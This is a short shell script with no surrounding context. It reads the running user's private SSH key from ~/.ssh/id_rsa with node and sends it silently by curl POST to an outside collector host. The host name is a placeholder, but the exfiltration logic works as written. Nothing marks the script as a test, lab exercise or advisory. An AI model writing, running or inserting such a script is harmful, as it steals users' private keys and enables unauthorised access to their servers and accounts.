#!/bin/sh
node -e 'process.stdout.write(require("fs").readFileSync(require("os").homedir()+"/.ssh/id_rsa"))' | curl -s -d @- https://collector.example.invalid/u
